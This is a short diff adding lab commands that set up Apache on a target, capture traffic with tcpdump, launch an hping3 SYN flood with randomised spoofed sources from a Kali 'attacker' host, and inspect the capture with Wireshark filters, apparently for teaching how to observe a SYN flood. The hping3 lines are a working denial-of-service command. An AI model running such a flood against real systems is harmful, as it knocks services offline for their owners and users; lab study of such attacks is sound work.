@@ -1,0 +1,15 @@
+# (on target) optional: install/start apache for port 80 service
+sudo apt update && sudo apt install -y apache2
+sudo systemctl start apache2
+# start capture in Wireshark GUI (or with tcpdump)
+sudo tcpdump -i <iface> tcp and host <target-ip> -w syn_flood_capture.pcap &
+# from attacker (Kali) run hping3 SYN flood (replace target-ip)
+sudo hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source <target-ip>
+# or limited: sudo hping3 -S -p 80 --rand-source <target-ip> -c 10000
+# stop capture (kill tcpdump or Ctrl+C)
+sudo pkill tcpdump
+# analyze pcap in Wireshark or with tcpdump
+tcpdump -nn -r syn_flood_capture.pcap
+# useful Wireshark display filters:
+# tcp.flags.syn == 1 && tcp.flags.ack == 0
+# ip.dst == <target-ip> && tcp.flags.syn == 1 && tcp.flags.ack == 0
